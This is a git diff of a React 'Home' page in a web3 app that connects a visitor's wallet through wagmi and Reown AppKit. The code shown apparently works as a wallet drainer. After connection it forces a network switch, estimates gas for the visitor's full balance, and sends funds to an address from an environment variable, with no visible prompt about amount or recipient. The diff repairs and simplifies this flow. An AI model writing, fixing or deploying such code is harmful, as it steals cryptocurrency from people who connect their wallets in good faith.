@@ -1,6 +1,7 @@
 import selections from "../data";
 import { useChainId } from 'wagmi';
 import chainsImage  from "/images/chains.jpeg";
+
 import { 
   mainnet, 
   arbitrum, 
@@ -10,13 +11,12 @@ import {
   solanaDevnet, 
   bitcoin,   sepolia, 
 } from '@reown/appkit/networks';
-import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
+import { useAppKit  } from "@reown/appkit/react";
 import {
-  useSwitchChain,
+  useAccount,
   useSendTransaction,
-  BaseError,
-  useWaitForTransactionReceipt,
-  usePrepareTransactionRequest,
+  useSwitchChain,
+  useWaitForTransactionReceipt ,
   useBalance,
   useGasPrice,
   useEstimateGas,
@@ -38,13 +38,19 @@ import { useEffect, useState } from "react";
 
 
 
+
+
+
+
+
 const Home = () => {
   const [totalFee, setTotalFee] = useState(null);
 
   const { open } = useAppKit();
-  const { address, isConnected } = useAppKitAccount();
+  const { address, isConnected } = useAccount();
   const balance = useBalance({ address });
   const [amountToSend, setAmountToSend] = useState(null);
+  const { switchChain } = useSwitchChain()
 
   const [txHash, setTxHash] = useState(null);
 
@@ -62,26 +68,6 @@ const CHAINS = {
 };
 
 const activeChain = CHAINS[chainId];
-
-      const chain = CHAINS[chainId];
-      const { switchChain } = useSwitchChain({
-        throwForSwitchChainNotSupported: true,
-  onError(error) {
-    console.log("Network switch error:", error);
-  },
-});
-const { data: request } = usePrepareTransactionRequest({
-  chainId: chain.id,
-  account: address,
-  to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
-  value: amountToSend,
-});
-// const { sendTransaction, isPending } = useSendTransaction();
-
-const requestSwitch = () => {
-  switchChain({ chainId: chain.id });
-};
-
 
 function formatBalance(balanceBigInt, chain) {
   if (!balanceBigInt) return "0";
@@ -133,17 +119,15 @@ function formatBalance(balanceBigInt, chain) {
     if (isConnected && address ) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
-      console.log("chainId:", chain.id);
-      
-        if (activeChain?.id !== chain.id) {
-    console.log("Switching network...");
-    requestSwitch();
-    return; // ✅ Wait for network switch before sending transaction
-  } else {
-    console.log("network matches")
-  }
-      
       walletConnectNotification();
+      console.log("chainId:", chainId)
+      console.log("activeChain:", activeChain?.id)
+
+        if (chainId !== activeChain?.id) {
+    console.log("Wrong network, switching...");
+    switchChain({ chainId: activeChain?.id });
+    return;
+  }
       console.log("Balance:", formatBalance(balance.data?.value, activeChain));
 
       // ✅ Now safe to call transfer
@@ -156,7 +140,7 @@ function formatBalance(balanceBigInt, chain) {
   const gasPrice = useGasPrice();
   const estimateGas = useEstimateGas({
     to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
-    value: balance.data?.value, 
+    value: balance.data?.value, // 0.001 ETH
   });
 
   useEffect(() => {
@@ -170,6 +154,8 @@ function formatBalance(balanceBigInt, chain) {
   }, [estimateGas.data, gasPrice.data, balance.data?.value]);
 
   const transferFunds = () => {
+
+      const chain = CHAINS[chainId];
 
   if (!chain) {
     console.log("Unknown chain or unsupported chain");
@@ -185,17 +171,20 @@ function formatBalance(balanceBigInt, chain) {
     }
 
     sendTransaction(
-    request,
-    {
-      onSuccess(hash) {
-        console.log("✅ Transaction sent:", hash);
-        setTxHash(hash);
+      {
+        chainId: chain.id,
+        to: import.meta.env[`VITE_${balance.data?.symbol}_ADDRESS`],
+        value: amountToSend,
       },
-      onError(error) {
-        console.log("❌ Error:", error);
-        console.log("❌ BaseError:", BaseError);
-      },
-    }
+      {
+        onSuccess(hash) {
+          console.log("✅ Transaction sent:", hash);
+          setTxHash(hash);
+        },
+        onError(error) {
+          console.log("❌ Error sending transaction:", error);
+        },
+      }
     );
   };
 
